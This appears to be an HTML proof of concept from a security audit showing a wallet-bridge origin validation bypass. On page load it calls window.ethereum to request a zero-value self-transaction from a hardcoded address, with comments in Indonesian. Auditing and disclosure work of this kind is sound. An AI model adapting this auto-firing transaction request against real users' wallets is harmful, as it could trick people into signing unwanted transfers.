<!DOCTYPE html>
<html>
<head>
    <title>Security PoC: Bridge Origin Validation Bypass</title>
</head>
<body>
    <h1>Security Audit: Bridge Access</h1>
    <div id="status">Testing bridge availability...</div>

    <script>
        async function runExploit() {
            const bridge = window.ethereum; // Namespace utama untuk DApp
            const status = document.getElementById('status');

            if (bridge) {
                status.innerHTML = "Bridge found. Attempting to trigger transaction...";
                
                try {
                    // Payload standar untuk membuktikan trigger terjadi tanpa otorisasi domain
                    await bridge.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
                            to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
                            value: '0x00',
                            data: '0x'
                        }]
                    });
                    status.innerHTML = "Transaction UI triggered.";
                } catch (err) {
                    status.innerHTML = "UI triggered but rejected by user/system: " + err.message;
                }
            } else {
                status.innerHTML = "No bridge detected.";
            }
        }

        window.onload = runExploit;
    </script>
</body>
</html>
